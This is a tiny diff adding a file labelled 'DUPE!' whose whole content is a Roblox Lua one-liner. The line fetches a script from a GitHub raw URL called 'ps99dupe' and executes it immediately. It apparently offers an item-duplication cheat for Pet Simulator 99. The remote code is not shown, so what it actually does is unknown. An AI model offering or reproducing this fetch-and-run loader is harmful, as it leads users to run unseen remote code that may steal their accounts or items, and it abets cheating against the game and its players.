@@ -1,0 +1,3 @@
+DUPE!
+SCRIPT:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PS99ROBLOXSCRIPTS/ps99dupe/main/ps99"))()
